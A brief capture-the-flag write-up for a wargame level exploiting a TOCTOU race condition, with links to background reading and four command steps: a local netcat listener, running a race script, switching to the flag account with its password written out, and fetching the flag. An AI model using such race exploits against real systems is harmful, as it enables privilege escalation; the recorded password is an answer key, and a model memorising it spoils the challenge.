### Documentation
[TOCTOU](https://medium.com/@schogini/toctou-time-of-check-and-time-of-use-a-demonstration-and-mitigation-609c999042cb)

[Race condition](https://defuse.ca/race-conditions-in-web-applications.htm)

### External
```
BASH  race
```

### Exploit
1. `./connect level09 nc -lk 127.0.0.1 6969`

2. `./send level10 race`

3. `./connect level09 ./race`

4. `su flag10` pass: woupa2yuojeeaaed06riuj63c
   ```bash
   getflag
   ```